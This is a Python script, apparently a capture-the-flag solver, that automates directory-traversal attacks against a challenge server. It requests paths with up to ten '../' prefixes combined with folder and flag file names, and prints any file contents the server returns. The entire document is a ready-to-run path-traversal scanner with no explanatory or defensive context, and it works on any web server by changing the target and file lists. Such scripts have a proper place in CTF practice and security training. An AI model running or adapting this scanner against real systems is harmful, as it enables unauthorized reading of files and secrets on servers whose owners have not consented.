import requests

TARGET = "http://ctf.find-it.id:6001"
DEPTH = 10
DIRS = ["", "docs", "secret", "app", "build", "bin", "ctf", "flags"]
FILES = ["flag", "flag.txt", ".flag", "real_flag.txt", "the_flag", "FLAG", "FLAG.txt"]

def try_path(path):
    url = f"{TARGET}/{path}"
    print(f"[*] Trying: {url}")
    try:
        r = requests.get(url, timeout=5)
        if "Resource not found" not in r.text:
            print(f"[+] FOUND: {url}")
            print("----- RESPONSE -----")
            print(r.text.strip())
            print("--------------------")
            return True
    except Exception as e:
        print(f"[!] Error: {e}")
    return False

def main():
    for d in range(1, DEPTH + 1):
        prefix = "../" * d
        for folder in DIRS:
            for file in FILES:
                path = f"{prefix}{folder}/{file}".replace("//", "/").strip("/")
                if try_path(path):
                    return
    print("[-] Still no flag found.")

if __name__ == "__main__":
    main()
